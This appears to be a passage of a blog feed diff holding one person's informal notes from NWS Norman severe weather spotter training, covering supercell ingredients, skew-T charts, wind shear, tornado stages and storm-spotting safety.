+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ingredients for supercells:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;moisture&lt;/li&gt;
+  &lt;li&gt;instability&lt;/li&gt;
+  &lt;li&gt;lift&lt;/li&gt;
+  &lt;li&gt;windshear&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;a-moisture&quot;&gt;A. Moisture&lt;/h3&gt;
+&lt;p&gt;Oklahoma&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;main moisture source is Gulf of Mexico&lt;/li&gt;
+  &lt;li&gt;Measurement: dewpoint around 50-55* for supercells, higher for tornadic supercells&lt;/li&gt;
+  &lt;li&gt;When air feels real most, basically&lt;/li&gt;
+  &lt;li&gt;Example. May 9th 2010, dewpoints where low to mid sixties
+    &lt;ul&gt;
+      &lt;li&gt;90 * fahrenheit air/ 68*F dew&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tornado Likelihood:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;low level moisture&lt;/li&gt;
+  &lt;li&gt;causes higher instability in low levels&lt;/li&gt;
+  &lt;li&gt;supports stronger and persistent updrafts&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Southern/southeasterly winds across plains transport low level moisture&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;difference between dewpoint and low level related to likelihood&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Monitoring Moisture&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;oklahoma mesonet website has great observations on moisture&lt;/li&gt;
+  &lt;li&gt;SPC mesonalaysis graph page&lt;/li&gt;
+  &lt;li&gt;Raw Skew-T plot moisture from surface to top of atmosphere&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;b-instability&quot;&gt;B. Instability&lt;/h3&gt;
+&lt;p&gt;Stable vs unstable:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;balloon example. Cool air at surface, balloon will want to rise less&lt;/li&gt;
+  &lt;li&gt;cool lower, warm upper layer is stable&lt;/li&gt;
+  &lt;li&gt;inverse is unstable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The cap&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;theres a sliver of warm air that is keeping air parcels from rising any further upward&lt;/li&gt;
+  &lt;li&gt;inhibits severe thunderstorm development&lt;/li&gt;
+  &lt;li&gt;AKA convective inhibition (CIN)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Skew-Ts&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Red line is environment temperature&lt;/li&gt;
+  &lt;li&gt;Temperature on x axis, pressure on Y&lt;/li&gt;
+  &lt;li&gt;How to read:
+    &lt;ul&gt;
+      &lt;li&gt;temperature at 500 millibars, follow y line to the red line at 500 millibars&lt;/li&gt;
+      &lt;li&gt;yellow is the temperature of bubble of air as it rises
+        &lt;ul&gt;
+          &lt;li&gt;it rises and cools&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;green is dewpoint&lt;/li&gt;
+      &lt;li&gt;area between redline  and yellow line
+        &lt;ul&gt;
+          &lt;li&gt;greater area is greater convective available energy (CAPE)&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;A cap on a skew t looks like an area on the bottom where parcel temperature is lower than environment temperature at the altitude&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Monitoring instability&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;greater than 1000 joules per kg is considered unstable&lt;/li&gt;
+  &lt;li&gt;SPC mesoscale analysis
+    &lt;ul&gt;
+      &lt;li&gt;thermodynamic data
+        &lt;ul&gt;
+          &lt;li&gt;most often use CAPE and Mixed layer CAPE&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Lifted index used to determine instability of an airmass
+        &lt;ul&gt;
+          &lt;li&gt;comparing temperature at two different levels&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Lapse rates
+        &lt;ul&gt;
+          &lt;li&gt;mostly used for hail potential estimation&lt;/li&gt;
+          &lt;li&gt;rate that temperature is changing as you gain altitude&lt;/li&gt;
+          &lt;li&gt;closer to 7.5 or greater indicate severe hail threat&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;LCL Height
+        &lt;ul&gt;
+          &lt;li&gt;Lower the cloud base the more potential for tornado development&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;instability in NWS discussions&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;c-lift&quot;&gt;C. Lift&lt;/h1&gt;
+
+&lt;p&gt;Multiple kinds. Means “something to give a nudge upward”&lt;/p&gt;
+
+&lt;p&gt;May include:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Fronts (cold &amp;amp; warm)&lt;/li&gt;
+  &lt;li&gt;Dry lines
+    &lt;ul&gt;
+      &lt;li&gt;can be important in our part of the country&lt;/li&gt;
+      &lt;li&gt;seperation of humid and dry air&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Outflow boundaries
+    &lt;ul&gt;
+      &lt;li&gt;thunderstorms can generate lift themselves&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Sufficient solar heating discrepencies in ares&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Frontal Lift:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;lift along a warm front is more gradual than a cold front
+    &lt;ul&gt;
+      &lt;li&gt;lighter percipition, percipitation well ahead of a front&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Cold front
+    &lt;ul&gt;
+      &lt;li&gt;air rises more abruptly, rain right ahead of the front&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Convergance&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Surface heating
+    &lt;ul&gt;
+      &lt;li&gt;some land areas heating up more than others&lt;/li&gt;
+      &lt;li&gt;locally warm air will rise and surrounding air will move in from the sides to fill its place&lt;/li&gt;
+      &lt;li&gt;no where to go but up&lt;/li&gt;
+      &lt;li&gt;enough of it, clouds are generated. if sustained, can produce thunderstorms&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Dry Lines&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;big discrepencies in moisture,&lt;/li&gt;
+  &lt;li&gt;watch for intersecting air currents pushing those areas together&lt;/li&gt;
+  &lt;li&gt;storms often form right in front of the dry line, on the moist side&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Outflow boundaries&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;could outflow pushes away from a storm&lt;/li&gt;
+  &lt;li&gt;the area between the boundary and the storm has potential for new storms.&lt;/li&gt;
+  &lt;li&gt;that area is a zone of lift&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Monitoring Boundaries&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;SPC mesoanalysis page&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;dwind-shear&quot;&gt;D.Wind Shear&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;increase of wind speed or direction with height&lt;/li&gt;
+  &lt;li&gt;important for forming supercells, without it the storm kills itself by downdrafting on itself&lt;/li&gt;
+  &lt;li&gt;Deep sehar needed for supercells&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Multiple different types&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;simple change with windspeed with height&lt;/li&gt;
+  &lt;li&gt;change in direction with height&lt;/li&gt;
+  &lt;li&gt;change in wind speed AND direction with height
+    &lt;ul&gt;
+      &lt;li&gt;biggest potential for instability&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Skew-T charts&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Windws plotted at right&lt;/li&gt;
+  &lt;li&gt;Wind speed
+    &lt;ul&gt;
+      &lt;li&gt;Add the lines
+        &lt;ul&gt;
+          &lt;li&gt;long line is ten, short line is 5&lt;/li&gt;
+          &lt;li&gt;triangle is 50&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Shear for supercells
+    &lt;ul&gt;
+      &lt;li&gt;Do winds change in direction and speed as you move from bottom of sounding to 500 mb level&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Shear for tornados&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Change in wind speed and direction causes vortex tubes
+    &lt;ul&gt;
+      &lt;li&gt;An updraft can tilt this vortex tube and caued vertical rotation&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Review
+    &lt;ul&gt;
+      &lt;li&gt;Supercell has a persistent rotating updraft (aka mesocyclone)&lt;/li&gt;
+      &lt;li&gt;Low level wind shear is the focus for tornado likelihood&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Likelihood scenario&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;high low level windshear in the lowest levels (esp. lowest 1 km)&lt;/li&gt;
+  &lt;li&gt;surface winds become more easterly (backing of winds)&lt;/li&gt;
+  &lt;li&gt;Increases along boundaries such as outflow&lt;/li&gt;
+  &lt;li&gt;Tornadogenesis more likely if a supercell travels parallel along the boundary&lt;/li&gt;
+  &lt;li&gt;Sometimes storm-scale environment may compensate for a lack of larger scale environmental conditions&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In this part of the country, the low level jet enhances low level shear/helicity&lt;/p&gt;
+
+&lt;p&gt;Monitoring Wind Shear:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;spc page has wind shear tab:
+    &lt;ul&gt;
+      &lt;li&gt;Effective bulk shear - deep layer wind shear
+        &lt;ul&gt;
+          &lt;li&gt;greater than 30/35 knots is good enough for supercell dev&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Low level windshear
+        &lt;ul&gt;
+          &lt;li&gt;surface to 1 km
+            &lt;ul&gt;
+              &lt;li&gt;higher values suggest better potential&lt;/li&gt;
+              &lt;li&gt;greater than 20 knots is ideal for tornadogenesis&lt;/li&gt;
+            &lt;/ul&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-storm-structure-and-evolution&quot;&gt;3. Storm Structure and Evolution&lt;/h2&gt;
+
+&lt;p&gt;Build upon the mesoscale features&lt;/p&gt;
+
+&lt;p&gt;Anatomy of a supercell: side view&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Storms start with an updraft
+    &lt;ul&gt;
+      &lt;li&gt;strong updrafts more likely to produce severe weather&lt;/li&gt;
+      &lt;li&gt;can be above 100 mph&lt;/li&gt;
+      &lt;li&gt;what goes up must come down. Air cools and causes rain/downdrafts&lt;/li&gt;
+      &lt;li&gt;Rotation is what makes the supercell persistent&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Types of supercells&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;low precipitaiton supercell
+    &lt;ul&gt;
+      &lt;li&gt;less dangerous&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Classic supercell
+    &lt;ul&gt;
+      &lt;li&gt;medium dangerous&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;High precipitation supercell
+    &lt;ul&gt;
+      &lt;li&gt;most dangeorus, mostly because of visibility&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Side view vs top view:
+LP supercell:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;weaker reflectivity&lt;/li&gt;
+  &lt;li&gt;smaller flanking line
+Classic supercell&lt;/li&gt;
+  &lt;li&gt;more defined flanking line, greater reflectivity&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;HP supercell&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Large, high reflectivity hook&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Types of downdrafts&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Forward Flank Downdraft (FFD)
+    &lt;ul&gt;
+      &lt;li&gt;Usually to the east or northeast of supercell&lt;/li&gt;
+      &lt;li&gt;Do not want to be near - low visibility an&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Rear Flank Downdraft
+    &lt;ul&gt;
+      &lt;li&gt;very strong winds&lt;/li&gt;
+      &lt;li&gt;can be more damaging than the tornado itself&lt;/li&gt;
+      &lt;li&gt;can possibly by clear slots&lt;/li&gt;
+      &lt;li&gt;can be wet dry or both&lt;/li&gt;
+      &lt;li&gt;warm is buoyant and unstable&lt;/li&gt;
+      &lt;li&gt;RFDs can be wet or dry (precip)&lt;/li&gt;
+      &lt;li&gt;Warmer RFDs are more unstable&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Mesocyclone&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;defining feature of a supercell&lt;/li&gt;
+  &lt;li&gt;rotating thunderstorm updraft&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;MS formation&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ambient shear creates a horizontal vortex tube&lt;/li&gt;
+  &lt;li&gt;updraft tilts the vortex up and streches it, incresing windspeed&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tornadoes&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;an intense rotating column of air&lt;/li&gt;
+  &lt;li&gt;that is in contact with the ground&lt;/li&gt;
+  &lt;li&gt;that extends from a thunderstorm cloud&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;tornadogenesis-stages&quot;&gt;Tornadogenesis stages&lt;/h3&gt;
+
+&lt;p&gt;development:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;can develop from ground upward or the middle or low levels downward&lt;/li&gt;
+  &lt;li&gt;RFD and precipitatio southwest  may signal higher likelihood&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;mature:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;strongest, most dangerous&lt;/li&gt;
+  &lt;li&gt;near vertical orientation, may not extend to ground or is hidden&lt;/li&gt;
+  &lt;li&gt;if there is debris on the ground, there is a tornado&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;dissipating&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;RFD wraps around the tornado&lt;/li&gt;
+  &lt;li&gt;RFD cuts off inflow&lt;/li&gt;
+  &lt;li&gt;tilts/becomes more ropelike or snakey&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Cyclic supercells&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;inflow can be refocused and cause a new tornado to form&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Current Theory on Supercell tornadogenesis&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;a nontornadic supercell something tornado genesis - https://sites.psu.edu/pmarkowski/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;qlcs&quot;&gt;QLCS&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Quasi Linear Convective System
+    &lt;ul&gt;
+      &lt;li&gt;squall lines and bow echoes&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Can be very dangerous&lt;/li&gt;
+  &lt;li&gt;Supercells have mesocylones, QLCS have mesovortices&lt;/li&gt;
+  &lt;li&gt;Can be just as strong but are very different&lt;/li&gt;
+  &lt;li&gt;Dont expect updraft striations&lt;/li&gt;
+  &lt;li&gt;Often rainwrapper&lt;/li&gt;
+  &lt;li&gt;Not all mesovortices produce tornadoes&lt;/li&gt;
+  &lt;li&gt;90% of these mesovortices ef1 or less&lt;/li&gt;
+  &lt;li&gt;can still be very dangerous&lt;/li&gt;
+  &lt;li&gt;May 25th 2019 El Reno tornado
+    &lt;ul&gt;
+      &lt;li&gt;Short lives, brutal tornado&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Much more dangerous to stormspot
+    &lt;ul&gt;
+      &lt;li&gt;quick moving&lt;/li&gt;
+      &lt;li&gt;rain wrapped&lt;/li&gt;
+      &lt;li&gt;short lived&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Scales of vortices&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Extratropical cyclones&lt;/li&gt;
+  &lt;li&gt;Mesoscale convective vortices&lt;/li&gt;
+  &lt;li&gt;mesocyclones&lt;/li&gt;
+  &lt;li&gt;tornadoes&lt;/li&gt;
+  &lt;li&gt;suction vortices&lt;/li&gt;
+  &lt;li&gt;hurricanes&lt;/li&gt;
+  &lt;li&gt;mesolows&lt;/li&gt;
+  &lt;li&gt;mesovortices&lt;/li&gt;
+  &lt;li&gt;gustnados&lt;/li&gt;
+  &lt;li&gt;landspouts&lt;/li&gt;
+  &lt;li&gt;dustdevils&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;landsputs&quot;&gt;Landsputs&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;higher base&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;gustnado&quot;&gt;Gustnado&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;along outflow of thunderstorm&lt;/li&gt;
+  &lt;li&gt;detached form cumulonimbus clouds&lt;/li&gt;
+  &lt;li&gt;any sort of wind shear can cause rotation&lt;/li&gt;
+  &lt;li&gt;can have damaging wind gusts&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;safe-positioning&quot;&gt;Safe Positioning&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Storm motion&lt;/li&gt;
+  &lt;li&gt;Road network&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Position of vehicle&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Be aware of splitting supercells
+    &lt;ul&gt;
+      &lt;li&gt;Left split - more likely hail&lt;/li&gt;
+      &lt;li&gt;Right split - more likely tornadoes
+        &lt;ul&gt;
+          &lt;li&gt;can even turn south/southest&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Most important point&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Dont get killed&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Josh Finley</name></author><summary type="html">Notes on Advanced Severe Weather Spotter Training webinar #skywarn.</summary></entry><entry><title type="html">NWS Norman - Severe Weather Spotter Training Notes Session 1</title><link href="http://localhost:4000/spotter-training-1/" rel="alternate" type="text/html" title="NWS Norman - Severe Weather Spotter Training Notes Session 1" /><published>2020-03-24T00:06:30-05:00</published><updated>2020-03-24T00:06:30-05:00</updated><id>http://localhost:4000/spotter-training-1</id><content type="html" xml:base="http://localhost:4000/spotter-training-1/">&lt;p&gt;Notes on Severe Weather Spotter Training on 3-24-2020&lt;/p&gt;
+
+&lt;h2 id=&quot;role-of-the-spotter&quot;&gt;Role of the spotter&lt;/h2&gt;
+&lt;ol&gt;
+  &lt;li&gt;Stay safe&lt;/li&gt;
+  &lt;li&gt;Observe &amp;amp; Identify
+    &lt;ol&gt;
+      &lt;li&gt;Weather type&lt;/li&gt;
+      &lt;li&gt;Location&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Report
+    &lt;ol&gt;
+      &lt;li&gt;Emergency managers&lt;/li&gt;
+      &lt;li&gt;NWS&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The farther a storm is from a radar, the higher the altitude of the scanning area&lt;/li&gt;
+  &lt;li&gt;Spotters fill the gap between the radar and the ground&lt;/li&gt;
+  &lt;li&gt;Remote measurement tools can help indicate a tornado may be forming, but spotters can only confirm it&lt;/li&gt;
+  &lt;li&gt;Boxes around radar telemetry are called polygons and are related to warning for storms&lt;/li&gt;
+  &lt;li&gt;Spotter reports give confirmation of warning and give information that may indicate that the warning should be extended or changed&lt;/li&gt;
+  &lt;li&gt;Helps across counties&lt;/li&gt;
+  &lt;li&gt;Helps tools calibration&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What is a severe thunderstorm?&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;hail 1” diameter or larger&lt;/li&gt;
+  &lt;li&gt;Wind 58 mph or more&lt;/li&gt;
+  &lt;li&gt;tornado&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When is tornado season?&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;A tornado can occur at any time of the year&lt;/li&gt;
+  &lt;li&gt;Tornado climatology&lt;/li&gt;
+  &lt;li&gt;Majority occur spring/early summer&lt;/li&gt;
+  &lt;li&gt;Oklahoma averages 56/yr&lt;/li&gt;
+  &lt;li&gt;We’ve had two as of today&lt;/li&gt;
+  &lt;li&gt;Last year was a record of 149, 105 in May&lt;/li&gt;
+  &lt;li&gt;majority of tornadoes were weak (below ef3)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tornado Intensity&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Cannot be determined visually&lt;/li&gt;
+  &lt;li&gt;Size is not a reliable indiciator&lt;/li&gt;
+  &lt;li&gt;Determined by damage done&lt;/li&gt;
+  &lt;li&gt;EF0 65-85mph&lt;/li&gt;
+  &lt;li&gt;Damage Indicator is ranked on an index&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Watches and Warnings&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Watch
+    &lt;ul&gt;
+      &lt;li&gt;Valid 4-6 hours typically&lt;/li&gt;
+      &lt;li&gt;SVR WX possible&lt;/li&gt;
+      &lt;li&gt;Can be large (100 mi+) areas&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Warning
+    &lt;ul&gt;
+      &lt;li&gt;SVR WX Likely&lt;/li&gt;
+      &lt;li&gt;Valid 1 hr or less typically&lt;/li&gt;
+      &lt;li&gt;Flash flooding can be 3 hours or less&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Storm Spotting Strategies:
+Being Safe and Informed&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Check NWS website&lt;/li&gt;
+  &lt;li&gt;Check spc.gov for Convective outlooks&lt;/li&gt;
+  &lt;li&gt;Read Hazardous Weather Outlook
+    &lt;ul&gt;
+      &lt;li&gt;5AM noon weather radio&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Listen to Weather Radio&lt;/li&gt;
+  &lt;li&gt;Watch satellite/radar&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;NEW-SPC Probablitiy Day-2 Outlooks&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tornado, hail, wind&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Spotter Safety&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Dont spot alone&lt;/li&gt;
+  &lt;li&gt;Know where you are&lt;/li&gt;
+  &lt;li&gt;Know where the storm is&lt;/li&gt;
+  &lt;li&gt;Know hos it is moving&lt;/li&gt;
+  &lt;li&gt;Have an escape route&lt;/li&gt;
+  &lt;li&gt;Seperate spotters should focus on different objects. One set of eyes on one object.&lt;/li&gt;
+  &lt;li&gt;Know whether roads are paved or not&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lightning Hazards&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Lightning is the biggest hazard&lt;/li&gt;
+  &lt;li&gt;If you can hear thunder, lightning is close enough to strike you&lt;/li&gt;
+  &lt;li&gt;Lightning is extremely unpredictable&lt;/li&gt;
+  &lt;li&gt;Stay inside your vehicle&lt;/li&gt;
+  &lt;li&gt;External antennae can be lightning rods. Avoid contact with the microphone itself&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tornado hazards&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Downdraft winds&lt;/li&gt;
+  &lt;li&gt;Hail&lt;/li&gt;
+  &lt;li&gt;Debris&lt;/li&gt;
+  &lt;li&gt;Know an escape route&lt;/li&gt;
+  &lt;li&gt;Be extra cautious when visibility is low (natural and manmade)&lt;/li&gt;
+  &lt;li&gt;Debris is a huge threat (dumpster example from 2019 El Reno, not an intense tornado. Still flung a dumpster)&lt;/li&gt;
+  &lt;li&gt;You should not be able to see debris near you&lt;/li&gt;
+  &lt;li&gt;Tornadoes do not always move in a straight line. El Reno almost did complete U turn&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After Dark&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Very dangerous&lt;/li&gt;
+  &lt;li&gt;Reference points for distance of objects are criticals&lt;/li&gt;
+  &lt;li&gt;Lightning BEHIND an object like a tornado is helpful. In front is extremely hazardous because it can destroy night vision&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Vehicles&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;If a tornado is approaching your vehicle, abandon the vehicle&lt;/li&gt;
+  &lt;li&gt;Flooding is #1 severe weather killer in US. Mainly at night&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Hail&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Large hail can impact over 90mph&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Other hazards - Humans&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Other spotters&lt;/li&gt;
+  &lt;li&gt;Media&lt;/li&gt;
+  &lt;li&gt;Researchers&lt;/li&gt;
+  &lt;li&gt;Traffic can hinder escapes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;After the Storm&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Tree limbs&lt;/li&gt;
+  &lt;li&gt;power lines&lt;/li&gt;
+  &lt;li&gt;power poles&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;identifying-key-features&quot;&gt;Identifying Key Features&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Storm Mode
+    &lt;ul&gt;
+      &lt;li&gt;Primary mode in Central plains are squall lines and supercells&lt;/li&gt;
+      &lt;li&gt;Both can occur at the same time&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Squall Line
+    &lt;ul&gt;
+      &lt;li&gt;Long, continuous line of thunderstorms&lt;/li&gt;
+      &lt;li&gt;Front edge is usually  most severe&lt;/li&gt;
+      &lt;li&gt;Strong straight lived winds, short lived tornadoes&lt;/li&gt;
+      &lt;li&gt;Spotters see low clouds often with motion underneath&lt;/li&gt;
+      &lt;li&gt;Very heavy rain, strong gusty winds&lt;/li&gt;
+      &lt;li&gt;Tornadoes less likely, but can happen along the leading edge&lt;/li&gt;
+      &lt;li&gt;Positioning and viewing
+        &lt;ul&gt;
+          &lt;li&gt;Find updraft area (ordinarily near fron of line)&lt;/li&gt;
+          &lt;li&gt;Find the updraft and downdraft convergence - tornado most likely here&lt;/li&gt;
+          &lt;li&gt;Supercells have severe weather more likely towards the back&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Supercell
+    &lt;ul&gt;
+      &lt;li&gt;Rotating updraft&lt;/li&gt;
+      &lt;li&gt;Organized, Long lasting storm&lt;/li&gt;
+      &lt;li&gt;Most significant severe weather&lt;/li&gt;
+      &lt;li&gt;Classic supercell
+        &lt;ul&gt;
+          &lt;li&gt;Bands (striations) indicate a rotating updraft&lt;/li&gt;
+          &lt;li&gt;Lightning strike may precede heavy rain or hail by several miles&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
